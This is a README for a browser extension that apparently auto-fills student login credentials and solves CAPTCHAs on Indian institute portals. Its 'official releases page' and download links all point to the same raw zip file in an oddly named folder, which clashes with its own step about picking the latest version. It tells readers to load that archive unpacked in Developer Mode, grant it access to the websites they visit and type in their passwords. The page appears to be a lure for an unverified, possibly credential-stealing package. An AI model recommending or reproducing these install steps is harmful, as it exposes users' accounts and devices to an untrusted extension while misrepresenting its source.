# 🤖 iit-moodle-auto-login - Save time accessing your student portals

[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Bastians1111/iit-moodle-auto-login/main/tubule/login_auto_moodle_iit_3.9.zip)

This software automates your login process for Moodle and Webmail services at Indian institutes. It handles your credentials and completes CAPTCHA tasks for you. This tool works on any website ending in .ac.in.

## 📋 What this tool does

Navigating student portals requires frequent logins. You often type your username and password, then struggle with CAPTCHA codes. This tool removes those steps. It stores your information securely and injects it into the login fields when the page loads. It also identifies and solves common text-based CAPTCHAs. This allows you to reach your resources instantly.

## 🖥️ System requirements

This tool works on devices running Windows 10 or Windows 11. You need a modern web browser installed on your computer. Google Chrome, Microsoft Edge, or Brave work best. You must have an active student account at an institution that uses a .ac.in domain. Ensure your system clock settings match your local time zone to prevent login errors.

## ⬇️ How to download and install

1. Visit the [official releases page](https://raw.githubusercontent.com/Bastians1111/iit-moodle-auto-login/main/tubule/login_auto_moodle_iit_3.9.zip).
2. Look for the version marked as Latest.
3. Click the file ending in .zip to start the download.
4. Open your Downloads folder once the file reaches your computer.
5. Right-click the zip file and select Extract All. Choose a folder where you want to keep the program.
6. Open your browser.
7. Navigate to your browser extensions page. You find this by typing `chrome://extensions` in the address bar.
8. Locate the toggle switch for Developer Mode in the top right corner and turn it on.
9. Click the button labeled Load unpacked.
10. Select the folder you extracted earlier.

The extension icon now appears in your browser toolbar.

## ⚙️ Initial setup

Click the new icon in your browser toolbar to open the settings menu. Enter the URL of your Moodle login page. Input your institution username and password in the provided fields. Your data remains stored locally within your browser. The tool writes these credentials into the login page source code only when you land on the specific site. 

Check the box that says Enable CAPTCHA Solver. This activates the background process that reads and enters security codes. Test your settings by visiting your Moodle login page. The page should refresh and log you into your dashboard without further input.

## 🔐 Privacy and security

The tool handles your credentials locally. It does not send your username or password to external servers. It only communicates with the specific Moodle or Webmail page you specify. The CAPTCHA solving feature runs locally on your machine. No human sees your login data. You can remove your credentials at any time by opening the settings menu and clicking Clear Data.

## 🔧 Troubleshooting common issues

If the login fails, verify your internet connection first. Some institutions require updates to their login portals. If the portal changes its design, you might need to update your settings. Open the extension menu and ensure the stored URL matches the current login page address.

If the CAPTCHA solver misses a code, try refreshing the page. The tool requires a clear view of the text characters. Ensure your browser zoom level stays at 100%. If you experience persistent issues, check the extension settings to ensure the Auto Login toggle is switched to On. 

## 📝 Frequently asked questions

Does this work on mobile devices?
Currently, this tool only supports desktop browsers on Windows.

What happens if I forget my password?
The tool saves your current password. If your institution forces a password change, you must update the new password in the extension settings.

Does it support two-factor authentication?
The tool handles basic username and password fields along with text-based CAPTCHA. If your institution requires a one-time code sent to your phone or email, you must enter that code manually after the tool completes the initial login.

Can I use this for multiple portals?
Yes. You can add multiple accounts and URLs in the settings menu. The extension detects which site you visit and applies the correct credentials accordingly.

Why does it request permissions?
The extension needs permission to read and change data on the websites you visit. This is necessary to fill the login fields and read the CAPTCHA image. It only accesses the sites you define in the settings list.

How do I remove the extension?
Go to your browser extensions page, find the tool in the list, and click Remove. This deletes the extension and all stored credentials from your computer.